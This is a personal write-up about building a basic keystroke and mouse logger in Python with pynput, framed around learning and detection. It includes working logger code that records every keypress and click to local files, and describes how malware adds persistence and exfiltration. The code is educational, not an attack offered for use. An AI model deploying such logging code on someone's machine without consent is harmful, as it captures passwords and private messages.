Keystroke & Mouse Tracking:
What I Built and Why It Matters

I built a basic input logger in Python to understand how it works at a low level. Then I looked at how the same techniques get weaponised — and what that means for detection and defence.

Context: This was built on my own machine for learning purposes only. Deploying input loggers without explicit consent is illegal in the UK under the Computer Misuse Act 1990. Understanding how attacks work is essential for defending against them.

Why I Looked Into This

My walk-away lock project got me thinking about the boundary between presence detection and surveillance. If you can detect that someone is at a keyboard, the next question is — what are they doing? Input logging sits right at that boundary. It's one of the most common techniques in both legitimate monitoring software and malware, so understanding it properly felt important.

How Keystroke Logging Works

At the OS level, every keypress generates an event that gets passed through an input processing chain. A keylogger hooks into this chain — either at the application layer or lower down at the kernel/driver level — and intercepts those events before or alongside the intended recipient.

User-space (application level)

  • Easier to implement
  • Easier to detect
  • Limited to foreground app on some OSes
  • Example: Python's pynput

Kernel-space (driver level)

  • Harder to implement
  • Much harder to detect
  • Captures all input system-wide
  • Used in serious malware

I worked at the user-space level using pynput, which gives you cross-platform keyboard and mouse listener hooks without needing kernel access.

What I Built

Basic keyboard listener

from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

def on_press(key):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        # Regular character key
        entry = f"[{timestamp}] {key.char}\n"
    except AttributeError:
        # Special key (shift, ctrl, enter etc.)
        entry = f"[{timestamp}] [{key}]\n"

    with open(log_file, "a") as f:
        f.write(entry)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

This captures every keypress with a timestamp — including special keys like Enter, Backspace, and modifier keys. The output immediately makes clear why this is dangerous: you can reconstruct passwords, search queries, messages, and anything else typed.

Adding mouse tracking

from pynput import mouse

def on_click(x, y, button, pressed):
    if pressed:
        timestamp = datetime.now().strftime("%H:%M:%S")
        with open("mouselog.txt", "a") as f:
            f.write(f"[{timestamp}] Click at ({x}, {y}) - {button}\n")

with mouse.Listener(on_click=on_click) as listener:
    listener.join()

Mouse coordinates reveal a lot. If you know the screen resolution and what app is open, click coordinates can reveal which UI elements were interacted with — buttons, form fields, links. Combined with keystrokes, you can reconstruct a session in significant detail.

The Security and Privacy Angle

How malware uses this

In the wild, keyloggers are usually packaged with persistence mechanisms — they write themselves to startup entries (Windows registry, systemd services, cron jobs) so they survive reboots. The log is then exfiltrated either periodically via HTTP/S POST requests, via email, or through a C2 (command and control) server.

What makes this particularly hard to detect is that the network traffic looks normal. A POST request with a small encrypted payload every few hours blends in with legitimate application telemetry.

Keystroke dynamics as a defence

There's an interesting flip side: the timing of keystrokes — how fast you type, your rhythm, how long you hold each key — is unique enough per person to be used as a behavioural biometric. This is called keystroke dynamics, and it can be used to continuously verify that the person at the keyboard is still the registered user. It's the behavioural equivalent of what I was doing with face recognition.

Detection approaches

  • Process monitoring — flag any process that registers a global keyboard hook. Tools like Process Monitor on Windows show this clearly.
  • Network traffic analysis — periodic small POST requests to unknown endpoints are a red flag, especially if the payload is encrypted.
  • File system monitoring — watch for new files being written to unusual locations, particularly AppData or temp directories on Windows.
  • Antivirus heuristics — most AV will flag pynput usage in isolation, though evasion is trivial at this level.

What I Took Away From This

Building it yourself — even a simple version — changes how you think about it. It took about 20 lines to have a working keystroke logger. That's the uncomfortable reality: the barrier to building the offensive tool is very low. The barrier to detecting it reliably, especially at the kernel level, is much higher.

It also made me more thoughtful about what runs on my machine. Most people have dozens of apps with input access they've never audited. On Windows, any application can register a low-level keyboard hook without elevated privileges. On macOS, accessibility permissions gate this — which is a meaningfully better model.
